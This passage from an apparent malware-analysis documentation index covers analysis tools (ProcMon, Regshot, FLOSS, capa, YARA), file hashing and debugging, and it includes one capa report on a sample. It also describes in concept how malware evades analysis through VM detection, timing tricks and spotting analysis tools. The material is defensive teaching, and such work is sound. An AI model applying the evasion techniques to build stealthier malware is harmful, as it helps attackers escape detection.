ignored.</p>"},{"location":"Reverse_Engineering/Basic_dynamic/#process-tree","title":"Process tree","text":"<p>rocMon also allows us to view all the existing processes in a parent-child relationship, forming a process tree. This can be done by clicking the Process Tree icon in the menu. This option helps identify the <code>parents</code> and <code>children</code> of different processes. As shown by ProcMon, an example process tree can be seen below.</p>"},{"location":"Reverse_Engineering/Basic_dynamic/#api-logger-and-api-monitor","title":"API logger and API monitor","text":"<p>The <code>Windows OS abstracts the hardware</code> and provides an Application Programmable Interface (API) for performing all tasks. For example, there is an API for creating files, an API for creating processes, an API for creating and deleting registries and so on. Therefore, one way to identify malware behaviour is to <code>monitor which APIs a malware calls</code>. The names of the APIs are generally self-explanatory. However, Microsoft Documentation can be referred to for finding information about the APIs.</p>"},{"location":"Reverse_Engineering/Basic_dynamic/#api-logger","title":"API logger","text":"<p>The API Logger is a simple tool that provides basic information about APIs called by a process.</p> <p>To open a new process, we can click the highlighted three-dot menu. When clicked, a file browser allows us to select the executable for which we want to monitor the API calls. Once we select the executable, we can click 'Inject &amp; Log' to start the API logging process. We will see the log of API calls in the lower pane. In the upper pane, we see the running processes and their PIDs.</p> <p>We can see the PID of the process we monitor and the API called with basic information about the API in the 'msg' field.</p> <p>We can click the 'PID' menu for the API logger to log API calls of a running process. It will open the Choose Process window.</p> <p>This Window shows processes with PIDs, the User that ran that process, and the image path of the process. The rest of the process is the same as the case with starting our process.</p>"},{"location":"Reverse_Engineering/Basic_dynamic/#api-monitor","title":"API monitor","text":"<p>The API Monitor provides more advanced information about a process's API calls. API Monitor has 32-bit and 64-bit versions for 32-bit and 64-bit processes, respectively. When we open API Monitor, we see the following Window.</p> <p></p> <p>As we can see, API Monitor has multiple tabs, as numbered in the image above:</p> <ol> <li>This tab is a filter for the API group we want to monitor. For example, we have a group for 'Graphics and Gaming' related APIs, another for 'Internet' related APIs and so on. API Monitor will only show us APIs from the group we select from this menu.</li> <li>This tab shows the processes being monitored for API calls. We can click the 'Monitor New Process' option to start monitoring a new process.</li> <li>This tab shows the API call, the Module, the Thread, Time, Return Value, and any errors. We can monitor this tab for APIs called by a process.</li> <li>This tab shows running processes that API Monitor can monitor.</li> <li>This tab shows the Parameters of the API call, including the values of those Parameters before and after the API calls.</li> <li>This tab shows the Hex buffer of the selected value.</li> <li>This tab shows the Call Stack of the process.</li> <li>This tab shows the Output.</li> </ol>"},{"location":"Reverse_Engineering/Basic_dynamic/#process-explorer","title":"Process explorer","text":"<p>Process Explorer is another very useful tool from the Sysinternals Suite. It can be considered a more <code>advanced form of the Windows Task Manager</code>. Process Explorer is a very powerful tool that <code>can help us identify process hollowing and masquerading techniques</code>.</p> <p>Upon opening we see all the different processes running in the system in a tree format. We can also see their CPU utilization, memory usage, Process IDs (PIDs), Description, and Company name. We can enable the lower pane view from the 'View' menu to find more information about the processes.</p> <p>When we select a process in the upper pane, we can see details about that process in the lower pane. Here, we see the Handles the process has opened for different Sections, Processes, Threads, Files, Mutexes, and Semaphores. <code>Handles</code> inform us about the resources being used in this process. If another process or a thread in another process is opened by a process, it can indicate code injection into that process. Similarly, we can see DLLs and Threads of the process in the other tabs of the lower pane.</p> <p>For some more details about a selected process, we can look at the properties of the process. We can do that by right-clicking the process name in the process tree and selecting 'Properties'.</p>"},{"location":"Reverse_Engineering/Basic_dynamic/#regshot","title":"Regshot","text":"<p>Regshot is a tool that <code>identifies any changes to the registry</code> (or the file system we select). It can be used to identify what registry keys were created, deleted, or modified during our dynamic analysis by malware. Regshot works by taking snapshots of the registry before and after the execution of malware and then comparing the two snapshots to identify the differences between the two.</p> <p>When we execute Regshot, we see the following interface:</p> <p></p> <p>In this simple interface, if we select the Scan dir1 option, we can also scan for changes to the file system. However, for the sake of brevity, we will only cover registry changes. To start, we can click on the '1<sup>st</sup> shot' option. It will ask us whether to take a shot or take a shot and save.</p> <p>Now that we have saved a shot of the registry, we can execute the malware. Once we have executed the malware and are confident that it has performed its malicious activity, we take a 2<sup>nd</sup> shot. For this, we click the '2<sup>nd</sup> shot' option.</p> <p>Now that we have both shots, we can compare them to identify the registry changes performed by the malware. We do that by clicking the 'Compare' option. Now, we will see a summary. Notice that it shows Keys and Values that were added, deleted, and modified. It also shows changes to Files and Folders.</p> <p>We see zero changes to Folders and Files because we had disabled 'Scan dir1' while taking the shots. If we had enabled this option and provided directories to monitor, we would have seen details about filesystem changes made by the malware in our selected directories.</p> <p>One advantage that Regshot enjoys over all the other tools discussed is that <code>it does not need to be running when we execute the malware</code>. Some malware can check all the running processes and shut down if any analysis tool is running. When analyzing, we might often encounter malware samples that check for ProcExp, ProcMon, or API Monitor before performing any malicious activity and quitting if these processes are found.</p> <p>On the flip side, we must ensure that no other process is running in the background while performing analysis with Regshot, as there is no filtering mechanism in Regshot, as we saw in the other tools. Hence, any noise created by background processes will also be recorded by Regshot, resulting in False Positives.</p>"},{"location":"Reverse_Engineering/Basic_static/","title":"Basic Static analysis","text":""},{"location":"Reverse_Engineering/Basic_static/#lab-setup","title":"Lab Setup","text":"<p>Some famous software used for creating and using Virtual Machines includes Oracle VirtualBox and VMWare Workstation Pro.</p> <p>Following steps portray the usage of Virtual Machines for malware analysis:</p> <ol> <li>Created a fresh Virtual Machine with a new OS install</li> <li>Set up the machine by installing all the required analysis tools in it</li> <li>Take a snapshot of the machine</li> <li>Copy/Download malware samples inside the VM and analyze it</li> <li>Revert the machine to the snapshot after the analysis completes</li> </ol>"},{"location":"Reverse_Engineering/Basic_static/#flare-vm","title":"FLARE VM","text":"<p>The <code>FLARE VM</code> is a Windows-based VM well-suited for malware analysis created by Mandiant (Previously FireEye). It contains some of the community's favorite malware analysis tools. Since it is a Windows-based VM, it can perform dynamic analysis of Windows-based malware.</p>"},{"location":"Reverse_Engineering/Basic_static/#remnux","title":"REMnux:","text":"<p><code>REMnux</code> stands for Reverse Engineering Malware Linux. It is a Linux-based malware analysis distribution created by Lenny Zeltser in 2010.</p> <p>Like the FLARE VM, it includes some of the most popular reverse engineering and malware analysis tools pre-installed.</p> <p>Being a Linux-based distribution, it cannot be used to perform dynamic analysis of Windows-based malware.</p>"},{"location":"Reverse_Engineering/Basic_static/#string-search","title":"String search","text":"<p>In the intro to (Malware) Analysis, we identified that searching for strings is one of the first steps in analysis.</p>"},{"location":"Reverse_Engineering/Basic_static/#how-a-string-search-works","title":"How a string search works:","text":"<p>A string search <code>looks at the binary data</code> in a malware sample regardless of its file type and <code>identifies sequences of ASCII or Unicode characters followed by a null character</code>. Wherever it finds such a sequence, it reports that as a string. This might raise the question that not all sequences of binary data that looks like ASCII or Unicode characters will be actual strings, which is right. </p> <p>Many sequences of bytes can fulfill the criteria mentioned above but are not strings of useful value; rather, they might include memory addresses, assembly instructions, etc. Therefore, a string search leads to <code>many False Positives (FPs)</code>. These FPs show up as garbage in the output of our string search and should be ignored. It is up to the analyst to identify the useful strings and ignore the rest.</p>"},{"location":"Reverse_Engineering/Basic_static/#what-to-look-for","title":"What to look for?","text":"<p>Since an analyst has to identify actual strings of interest and differentiate them from the garbage, it is good to know what to look for when performing a string search. Although a lot of useful information can be unearthed in a string search, the following artifacts can be used as <code>Indicators of Compromise (IOCs)</code> and prove more useful.</p> <ul> <li>Information about the possible functionality:</li> <li> <p>Windows <code>Functions</code> and <code>APIs</code> like:</p> <ul> <li><code>SetWindowsHook</code></li> <li><code>CreateProcess</code></li> <li><code>InternetOpen</code></li> <li><code>etc</code></li> </ul> </li> <li> <p>Information about possible C2 communication:</p> </li> <li><code>IP Addresses</code></li> <li><code>URLs</code></li> <li> <p><code>Domains</code></p> </li> <li> <p>Information that helps set the context for further analysis:</p> </li> <li><code>Miscellaneous strings</code> such as <code>Bitcoin addresses</code></li> <li><code>Text used for Message Boxes</code></li> <li><code>etc</code></li> </ul>"},{"location":"Reverse_Engineering/Basic_static/#basic-string-search","title":"Basic String Search","text":"<p>The <code>strings</code> utility, which is pre-installed in <code>Linux machines</code> can be used for a basic string search.</p> <p>Similarly, the FLARE VM comes with a Windows utility, <code>strings.exe</code>, that performs the same task. This Windows strings utility is <code>part of the Sysinternals suite</code>, a set of <code>tools published by Microsoft to analyze different aspects of a Windows machine</code>. Details about the strings utility can be found in Microsoft Documentation. </p> <p>The good thing about the command line strings utility is that it can <code>dump strings to a file for further analysis</code>.</p> <pre><code>C:\\Users\\Administrator\\Desktop&gt;strings &lt;path to binary&gt;\n</code></pre> <p>Several other tools included in the FLARE VM can be used for string search.</p> <p>For example:</p> <ul> <li><code>CyberChef</code> (Desktop&gt;FLARE&gt;Utilities&gt;Cyberchef) has a recipe for basic string search as well.</li> <li> <p><code>PEstudio</code> (Desktop&gt;FLARE&gt;Utilities&gt;pestudio) also provides a string search utility.</p> <p>PEstudio also provides some additional information about the strings, like, the encoding, size of the string, offset in the binary where the string was found, and a hint to guess what the string is related to. It also has a column for a blacklist, which matches the strings against some signatures.</p> </li> </ul> <p>E.g: PEstudio shows strings found by PEstudio in a malware sample. This can be done by selecting strings in the left pane after loading the PE file in PEstudio. The blacklist here shows a bunch of Windows API calls, which PEstudio flags as potentially used in malicious processes. You can learn about these APIs using resources like MalAPI or MSDN.</p>"},{"location":"Reverse_Engineering/Basic_static/#obfuscated-strings","title":"Obfuscated strings","text":"<p>Searching for strings often proves one of the most effective first steps in malware analysis. The malware authors know this and don't want a simple string search to thwart their malicious activities. Therefore, <code>they deploy techniques to obfuscate strings</code> in their malware. Malware authors use several techniques to obfuscate the key parts of their code. These techniques often render a string search ineffective, i.e., we won't find much information when we search for strings.</p>"},{"location":"Reverse_Engineering/Basic_static/#floss","title":"FLOSS","text":"<p>Mandiant (then FireEye) launched <code>FLOSS</code> to solve this problem, short for FireEye Labs Obfuscated String Solver. FLOSS uses several techniques to deobfuscate and extract strings that would not be otherwise found using a string search. The type of strings that FLOSS can extract and how it works can be found in Mandiant's blog post.</p> <p>To execute FLOSS, open a command prompt and navigate to the Desktop directory.</p> <pre><code>C:\\Users\\Administrator\\Desktop&gt;floss -h\n</code></pre> <p>This command will open the <code>help page for FLOSS</code>. We can use the following command to use FLOSS to search for obfuscated strings in a binary.</p> <pre><code>C:\\Users\\Administrator\\Desktop&gt;floss --no-static-strings &lt;path to binary&gt;\n</code></pre> <p>Please remember that the command <code>might take some time to execute</code>, and you might see what appear to be some <code>error messages before the results are generated</code>.</p>"},{"location":"Reverse_Engineering/Basic_static/#fingerprinting-malware","title":"Fingerprinting malware","text":"<p>When analyzing malware, it is often required to identify unique malware and <code>differentiate them from each other</code>.</p> <p>File names can't be used for this purpose as they can be duplicated easily and might be confusing. Also, a file name can be changed easily as well. Hence, a hash function is used to identify a malware sample uniquely.</p> <p>A hash function takes a file/data of arbitrary length as input and creates a fixed-length unique output based on file contents. This process is irreversible, as you can't recreate the file's contents using the hash. <code>Hash functions have a very low probability (practically zero) of two files having different content but the same hash</code>. A hash remains the same as long as the file's content remains the same. However, even a slight change (1 bit) in content will result in a different hash. It might be noted that the <code>file name is not a part of the content</code>; therefore, changing the file name does not affect the hash of a file.</p> <p>Besides identifying files, hashes are also used to store passwords to authenticate users. In malware analysis, hash files can be used to identify unique malware, search for this malware in different malware repositories and databases, and as an Indicator of Compromise (IOC).</p>"},{"location":"Reverse_Engineering/Basic_static/#commonly-used-methods-of-calculating-file-hashes","title":"Commonly used methods of calculating File hashes","text":"<p>For identification of files, a hash of the complete file is taken. There are various methods to take the hash. The most commonly used methods are:</p> <ul> <li>Md5sum</li> <li>Sha1sum</li> <li>Sha256sum</li> </ul> <p>The first two types of hashes are now considered insecure or prone to collision attacks (when two or more inputs result in the same hash). Although a collision attack for these hash functions is not very probable, it is still possible. Therefore, <code>sha256sum is currently considered the most secure method</code> of calculating a file hash.</p>"},{"location":"Reverse_Engineering/Basic_static/#finding-similar-files-with-hashes","title":"Finding similar files with hashes","text":"<p>Another scenario in which hash functions help a malware analyst is identifying similar files using hashes. We already established that even a slight change in the contents of a file would result in a different hash.</p> <p>However, some types of hashes can help identify the similarity among different files: - <code>Imphash</code>:</p> <p>The imphash stands for \"import hash\". Imports are functions that an executable file imports from other files or Dynamically Linked Libraries (DLLs). The imphash is a hash of the function calls/libraries that a malware sample imports and the order in which these libraries are present in the sample. This helps identify samples from the same threat groups or performing similar activities.</p> <p>Any malware samples with the same imports in the same order will have the same imphash. This helps in identifying similar samples.</p> <p></p> <ul> <li><code>Fuzzy hashes/SSDEEP</code>:</li> </ul> <p>Another way to identify similar malware is through fuzzy hashes. A fuzzy hash is a <code>Context Triggered Piecewise Hash (CTPH)</code>. This hash is calculated by dividing a file into pieces and calculating the hashes of the different pieces. This method creates <code>multiple inputs with similar sequences of bytes</code>, even though the whole file might be different.</p> <p>Multiple utilities can be used to calculate ssdeep, like CyberChef. However after having ssdeep installed you can show the help menu like so:</p> <pre><code>C:\\Users\\Administrator\\Desktop&gt;ssdeep-2.14.1\\ssdeep.exe -h\n</code></pre>"},{"location":"Reverse_Engineering/Basic_static/#signature-based-detection","title":"Signature-based detection","text":"<p>While using imphash or ssdeep provides a way to identify if some files are similar, sometimes we just need to identify if a file contains the information of interest. Hashes are not the ideal tool to perform this task.</p>"},{"location":"Reverse_Engineering/Basic_static/#signatures","title":"Signatures","text":"<p>Signatures are a way to <code>identify if a particular file has a particular type of content</code>. We can consider a signature as a pattern that might be found inside a file. This pattern is often a <code>sequence of bytes</code> in a file, with or without any context regarding where it is found. Security researchers often use signatures to identify patterns in a file, <code>identify if a file is malicious, and identify suspected behavior and malware family</code>.  </p>"},{"location":"Reverse_Engineering/Basic_static/#yara-rules","title":"Yara rules","text":"<p>Yara rules are a type of <code>signature-based rule</code>. It is famously called a <code>pattern-matching swiss army knife for malware researchers</code>. Yara can identify information based on binary and textual patterns, such as hexadecimal and strings contained within a file.</p> <p>The security community publishes a repository of open-source Yara rules that we can use as per our needs. When analyzing malware, we can use this repository to dig into the community's collective wisdom. However, while using these rules, please keep in mind that <code>some might depend on context</code>. Some others might just be used for the <code>identification of patterns that can be non-malicious as well</code>. Hence, <code>just because a rule hits doesn't mean the file is malicious</code>.</p>"},{"location":"Reverse_Engineering/Basic_static/#proprietary-signatures-anti-virus-scans","title":"Proprietary signatures - Anti-virus Scans","text":"<p>Besides the open-source signatures, Antivirus companies spend lots of resources to create proprietary signatures. The advantage of these proprietary signatures is that <code>since they have to be sold commercially, there are lesser chances of False Positives</code> (FPs, when a signature hits a non-malicious file). However, this <code>might lead to a few False Negatives</code> (FNs, when a malicious file does not hit any signature).</p> <p>Antivirus scanning helps identify if a file is malicious with <code>high confidence</code>. Antivirus software will often mention the signature that the file has hit, which might hint at the file's functionality. However, we must note that despite their best efforts, <code>every AV product in the market has some FPs and some FNs</code>. Therefore, when analyzing malware, it is prudent to get a verdict from multiple products. The <code>Virustotal</code> website makes this task easier for us, where we can find the verdict about a file from 60+ AV vendors, apart from some very useful information. We also touched upon this topic in our Intro to Malware Analysis room.</p> <p>Please remember, if you are analyzing a sensitive file, it is best practice to <code>search for its hash</code> on Virustotal or other scanning websites <code>instead of uploading the file itself</code>. This is done to avoid leaking sensitive information on the internet and letting a sophisticated attacker know that you are analyzing their malware.</p>"},{"location":"Reverse_Engineering/Basic_static/#capa","title":"Capa","text":"<p>Capa is another open-source tool created by Mandiant. This tool helps <code>identify the capabilities found in a PE file</code>. Capa reads the files and tries to <code>identify the behavior</code> of the file based on signatures such as <code>imports</code>, <code>strings</code>, <code>mutexes</code>, and <code>other artifacts present in the file</code>.</p> <p>Using Capa is simple. On the command prompt, we just point capa to the file we want to run it against.</p> <pre><code>C:\\Users\\Administrator\\Desktop&gt;capa mal\\1\nloading : 100%|\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588| 485/485 [00:00&lt;00:00, 1552.05     rules/s]\nmatching: 100%|\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588| 288/288 [00:12&lt;00:00, 22.23 functions/s]\n+------------------------+------------------------------------------------------------------------------------+\n| md5                    | 6548eec09f4d8bc6514bee3e5452541c                                                   |\n| sha1                   | 7be46c62d975949fdd6777530940cf6435e8cb90                                           |\n| sha256                 | 6ec74cc0a9b5697efd3f4cc4d3a21d9ffe6e0187b770990df8743fbf4f3b2518                   |\n| path                   | mal\\1                                                                              |\n+------------------------+------------------------------------------------------------------------------------+\n\n+------------------------+------------------------------------------------------------------------------------+\n| ATT&amp;CK Tactic          | ATT&amp;CK Technique                                                                   |\n|------------------------+------------------------------------------------------------------------------------|\n| DEFENSE EVASION        | Obfuscated Files or Information::Indicator Removal from Tools [T1027.005]          |\n|                        | Obfuscated Files or Information [T1027]                                            |\n| DISCOVERY              | Application Window Discovery [T1010]                                               |\n|                        | System Information Discovery [T1082]                                               |\n| EXECUTION              | Command and Scripting Interpreter [T1059]                                          |\n|                        | Shared Modules [T1129]                                                             |\n+------------------------+------------------------------------------------------------------------------------+\n\n+-----------------------------+-------------------------------------------------------------------------------+\n| MBC Objective               | MBC Behavior                                                                  |\n|-----------------------------+-------------------------------------------------------------------------------|\n| ANTI-STATIC ANALYSIS        | Disassembler Evasion::Argument Obfuscation [B0012.001]                        |\n| CRYPTOGRAPHY                | Encrypt Data::RC4 [C0027.009]                                                 |\n|                             | Generate Pseudo-random Sequence::RC4 PRGA [C0021.004]                         |\n| FILE SYSTEM                 | Delete File [C0047]                                                           |\n|                             | Read File [C0051]                                                             |\n|                             | Write File [C0052]                                                            |\n| OPERATING SYSTEM            | Console [C0033]                                                               |\n| PROCESS                     | Allocate Thread Local Storage [C0040]                                         |\n|                             | Set Thread Local Storage Value [C0041]                                        |\n|                             | Terminate Process [C0018]                                                     |\n+-----------------------------+-------------------------------------------------------------------------------+\n\n+------------------------------------------------------+------------------------------------------------------+\n| CAPABILITY                                           | NAMESPACE                                            |\n|------------------------------------------------------+------------------------------------------------------|\n| contain obfuscated stackstrings                      | anti-analysis/obfuscation/string/stackstring         |\n| encrypt data using RC4 PRGA                          | data-manipulation/encryption/rc4                     |\n| contains PDB path                                    | executable/pe/pdb                                    |\n| contain a resource (.rsrc) section                   | executable/pe/section/rsrc                           |\n| accept command line arguments                        | host-interaction/cli                                 |\n| manipulate console                                   | host-interaction/console                             |\n| query environment variable                           | host-interaction/environment-variable                |\n| delete file                                          | host-interaction/file-system/delete                  |\n| read file                                            | host-interaction/file-system/read                    |\n| write file (2 matches)                               | host-interaction/file-system/write                   |\n| enumerate gui resources                              | host-interaction/gui                                 |\n| get disk information                                 | host-interaction/hardware/storage                    |\n| get hostname                                         | host-interaction/os/hostname                         |\n| get thread local storage value (3 matches)           | host-interaction/process                             |\n| set thread local storage value (2 matches)           | host-interaction/process                             |\n| terminate process (5 matches)                        | host-interaction/process/terminate                   |\n| link function at runtime (8 matches)                 | linking/runtime-linking                              |\n| link many functions at runtime                       | linking/runtime-linking                              |\n| parse PE exports (2 matches)                         | load-code/pe                                         |\n| parse PE header (4 matches)                          | load-code/pe                                         |\n+------------------------------------------------------+------------------------------------------------------+\n\n\nFLARE Sun 09/18/2022 18:34:13.15\n</code></pre> <p>We can see that Capa has mapped the identified capabilities according to the <code>MITRE ATT&amp;CK framework</code> and <code>Malware Behavior Catalog (MBC)</code>. In the last table, we see the capabilities against the matched signatures and the number of signatures that have found a hit against these capabilities. As we might see, it also tells us if there are obfuscated stackstrings in the sample, allowing us to identify if running <code>FLOSS</code> against the sample might be helpful. To find out more information about the sample, we can use the <code>-v</code> or the <code>-vv</code> operator, which will show us the results in <code>verbose or very verbose mode</code>, identifying addresses where we might find the said capability.</p>"},{"location":"Reverse_Engineering/Basic_static/#leveraging-the-pe-header","title":"Leveraging the PE header","text":"<p>So far we have covered techniques that work regardless of the file type of the malware. However, those techniques are a little <code>hit-and-miss</code>, as they don't always provide us with deterministic information about the malware. The <code>PE headers provide a little more deterministic characteristics</code> of the sample, which tells us much more about the sample.</p>"},{"location":"Reverse_Engineering/Basic_static/#the-pe-header","title":"The PE header","text":"<p>Warning</p> <p>If you're unsure what this is, make sure to read about Portable executable file format.</p> <p>Several tools in the FLARE VM can help us analyze PE headers. <code>PEStudio</code> is one of them.</p> <p>The <code>PE header contains rich information</code> useful for malware analysis.</p>"},{"location":"Reverse_Engineering/CAPA/","title":"CAPA","text":""},{"location":"Reverse_Engineering/CAPA/#capa-cheat-sheet","title":"CAPA Cheat Sheet","text":"Command Description Example <code>capa [file]</code> Analyzes a binary file for capabilities. <code>capa malware.exe</code> <code>capa --rules [rules-dir] [file]</code> Specifies a custom rules directory for analysis. <code>capa --rules ./custom-rules malware.exe</code> <code>capa --format [format] [file]</code> Outputs results in a specified format (json, yaml, pgrep). <code>capa --format json malware.exe &gt; output.json</code> <code>capa --tag [tags] [file]</code> Filters results based on specific tags. <code>capa --tag persistence malware.exe</code> <code>capa --signatures [sigfile] [file]</code> Adds custom function signatures to the analysis. <code>capa --signatures myfuncs.sig malware.exe</code> <code>capa --verbose [file]</code> Displays additional diagnostic information. <code>capa --verbose malware.exe</code> <code>capa --ignore-unsupported</code> Skips errors related to unsupported file types. <code>capa --ignore-unsupported unknownfile.bin</code> <code>capa --color</code> Enables colorized output for better readability. <code>capa --color malware.exe</code>"},{"location":"Reverse_Engineering/CAPA/#common-capa-workflow","title":"Common CAPA Workflow","text":""},{"location":"Reverse_Engineering/CAPA/#basic-analysis-of-a-malware-binary","title":"Basic Analysis of a Malware Binary","text":"<pre><code># Basic Analysis of a Malware Binary\ncapa malware.exe\n\n# Analyzing with Verbose Output\ncapa --verbose malware.exe\n\n# Using a Custom Ruleset for Analysis\ncapa --rules ./custom-rules malware.exe\n\n# Exporting Results in JSON Format\ncapa --format json malware.exe &gt; results.json\n\n# Filtering for Specific Tags (e.g., Persistence)\ncapa --tag persistence malware.exe\n</code></pre>"},{"location":"Reverse_Engineering/Dynamic_debugging/","title":"Dynamic Analysis: Debugging","text":"<p>In Basic Dynamic Analysis, we learned to identify malware traces in the infected system during execution. However, malware authors understand that the malware will be analyzed and want to thwart it. This can be done through various evasion techniques.</p> <p>To defeat these evasion techniques, a malware analyst desires <code>more control over malware execution</code>.</p>"},{"location":"Reverse_Engineering/Dynamic_debugging/#the-need-for-advanced-dynamic-analysis","title":"The Need for Advanced Dynamic Analysis","text":"<p>Analyzing malware is like a cat-and-mouse game. Malware analysts keep devising new techniques to analyse malware, while malware authors devise new techniques to evade detection.</p>"},{"location":"Reverse_Engineering/Dynamic_debugging/#evasion-of-static-analysis","title":"Evasion of static analysis","text":"<p>Malware often hides or tries to look like legitimate software to evade the prying eyes of a malware analyst. Because we are not executing the malware during static analysis, the main focus of evading static analysis is to obfuscate the true functionality of the program until the program is executed. </p> <p>The following techniques can be commonly used to achieve this:</p> <ul> <li> <p><code>Changing the hash</code>: We have learned previously that every file has a unique hash. Malware authors exploit this functionality by <code>slightly changing their malware</code>. This way, the malware's hash changes, bypassing the hash-based detection mechanism. Hashes can change even if one bit of the malware is changed (unless we are talking Context-Triggered Piecewise Hashes or fuzzy hashes), so <code>just adding a NOP instruction or other such change can defeat the hash-based detection</code> techniques.</p> </li> <li> <p><code>Defeating AV signatures</code>: Anti-virus signatures and other signature-based detection often depend on static patterns found inside malware. Malware authors <code>change those patterns to try to evade signatures</code>. This technique is often <code>accompanied by general obfuscation</code> of malware code.</p> </li> <li> <p><code>Obfuscation of strings</code>: Some malware authors obfuscate the strings in malware by <code>decoding them at runtime</code>. When we search the malware for strings, we might find nothing useful. However, when the malware runs, it decodes those strings during execution. Malware authors might obfuscate <code>important strings, such as URLs</code>, <code>C2 domains</code>, <code>etc</code>., to avoid burning the infrastructure based on a single-string search.</p> </li> <li> <p><code>Runtime loading of DLLs</code>: Since we can identify malware imports while analyzing PE headers, malware authors often use the Windows libraries' <code>LoadLibrary</code> or <code>LoadLibraryEx</code> to <code>load a DLL at runtime</code>. When analyzing this malware statically, we might not see all the functions it is linked to while analyzing its headers.</p> </li> <li> <p><code>Packing and Obfuscation</code>: Packing is very popular amongst malware authors. Packing malware is like packing a present. When we look at a packed present, we can't say what might be inside it unless we unpack the wrapper and take out the present. Similarly, <code>packers pack the malware in a wrapper by writing code that decodes the malware at runtime</code>. So when performing static analysis, we might be unable to see what is inside the packer. However, when we execute the malware, it unpacks the code, loads the actual malicious code into the memory, and then executes it.</p> </li> </ul> <p>As we might have observed, most of these techniques are suitable for <code>hiding in plain sight</code>, but they can be defeated when the malware is executed while performing dynamic analysis. </p>"},{"location":"Reverse_Engineering/Dynamic_debugging/#evasion-of-basic-dynamic-analysis","title":"Evasion of Basic dynamic Analysis","text":"<p>Malware authors do not just accept their fate and let dynamic analysis detect their samples. For evasion of dynamic analysis, a host of techniques are employed. These techniques <code>generally depend on identifying whether the malware runs in a controlled analysis environment</code>.</p> <ul> <li> <p><code>Identification of VMs</code>: Though some of these techniques might backfire nowadays since a lot of enterprise infrastructure is hosted on VMs, one of the favourites of malware authors has been to identify if the malware is running inside a VM. For this, malware often <code>checks for registry keys or device drivers associated with popular virtualization software</code> such as VMWare and Virtualbox. Similarly, <code>minimal resources, such as a single CPU and limited RAM</code>, might indicate that the malware is running inside a VM. In this scenario, malware will take a different execution path that is not malicious to fool the analyst.</p> </li> <li> <p><code>Timing attacks</code>: Malware will often try to <code>time out automated analysis systems</code>. For example, when malware is executed, it will try to <code>sleep for a day using the Windows Sleep library</code>. After a few minutes, the <code>automated analysis system will shut down</code>, finding no traces of malicious activity. Newer malware analysis systems can identify these attacks and try to mitigate them by shortening the time the malware sleeps. However, malware can identify those mitigations by performing targeted timing checks to see if the time is being manipulated. This can be done by <code>noting the time of execution and comparing it with the current time after the execution of the sleep call</code>.</p> </li> <li> <p><code>Traces of user activity</code>: Malware tries to identify if there are traces of user activity in the machine. If no or very few traces are found, malware will decide that it is being executed inside a controlled system and take a different, benign execution path. Traces of user activity can include <code>no mouse or keyboard movement</code>, <code>lack of browser history</code>, <code>no recently opened files</code>, <code>little system uptime</code>, etc.</p> </li> <li> <p><code>Identification of analysis tools</code>: Malware can ask the Windows OS for a <code>running process list using Process32First</code>, <code>Process32Next</code>, or similar functions. If popular monitoring tools are identified among the <code>list of running processes</code>, malware can take a benign execution path. For example, if <code>ProcMon</code> or <code>ProcExp</code> is running, malware can identify that and switch to benign activities. Another way to identify analysis tools is by <code>looking at the names of different windows open in a system</code>. If the malware finds <code>Ollydbg</code> or <code>ProcMon</code> in the open Windows, it can switch to a different execution path.</p> </li> </ul> <p>By employing these techniques, malware authors make it difficult for malware analysts to perform analysis. However, malware analysts can use some tools and techniques to take greater control over malware execution, helping them defeat these evasion techniques.</p>"},{"location":"Reverse_Engineering/Dynamic_debugging/#introduction-to-debugging","title":"Introduction to debugging","text":"<p>The term Debugging is widely used by software programmers to identify and fix bugs in a program. Similarly, a malware sample trying to evade detection or reverse engineering can also be considered a program having a bug. A malware reverse engineer often has to <code>debug a program to remove any roadblocks</code> that prevent it from performing its malicious activity. Therefore, <code>interactive debugging</code> becomes an essential part of advanced malware analysis. <code>Debuggers</code> provide a malware analyst with the control desired to monitor a running program more closely, looking at the changes in different <code>registers</code>, <code>variables</code>, and <code>memory regions</code> as each instruction is executed. A debugger also allows a malware analyst to <code>change the variables' values</code> to control the program's flow at runtime, providing greater control over the execution path the malware follows.</p>"},{"location":"Reverse_Engineering/Dynamic_debugging/#types-of-debuggers","title":"Types of Debuggers","text":"<p>We can loosely categorize debuggers into one of the following three categories.</p>"},{"location":"Reverse_Engineering/Dynamic_debugging/#source-level-debuggers","title":"Source-Level Debuggers","text":"<p>Source Level Debuggers work on the <code>source code level</code>. Most software programmers use source-level debuggers <code>while writing code</code> to check their code for bugs. A source-level debugger is a <code>high-level debugger</code> compared to the other two options. When using a source-level debugger, we often see the local variables and their values.</p>"},{"location":"Reverse_Engineering/Dynamic_debugging/#assembly-level-debuggers","title":"Assembly-Level Debuggers","text":"<p>When a program has been compiled, its source code is lost and can't be recovered. This is the case with malware analysis. We don't have the malware's source code we are investigating; instead, we have a compiled binary. An assembly-level debugger can help us <code>debug compiled programs at the assembly level</code>. While debugging with an assembly-level debugger, we often see the <code>CPU registers' values</code> and the <code>debuggee's memory</code>. This is the most common type of debugger used for malware reverse engineering. <code>The debugger attaches to the program</code> that has to be debugged and executes it as per the analyst's desire.</p>"},{"location":"Reverse_Engineering/Dynamic_debugging/#kernel-level-debuggers","title":"Kernel-Level Debuggers","text":"<p>Kernel-level debuggers are a step even lower than assembly-level debuggers. As the name suggests, these debuggers debug a program at the Kernel Level. For this level of debugging, <code>generally, two systems are required</code>. <code>One system is used for debugging the code running on the other system</code>. This is because <code>if the kernel is stopped using a breakpoint, the whole system will stop</code>.</p>"},{"location":"Reverse_Engineering/Dynamic_debugging/#familiarization-with-a-debugger","title":"Familiarization With a Debugger","text":"<p>For malware analysis, there are many options to choose a debugger from. These options include <code>Windbg</code>, <code>Ollydbg</code>, <code>Scdbg</code>, <code>Cheat Engine</code>, etc. </p> <p>For this example, we will be using <code>x32dbg</code> and 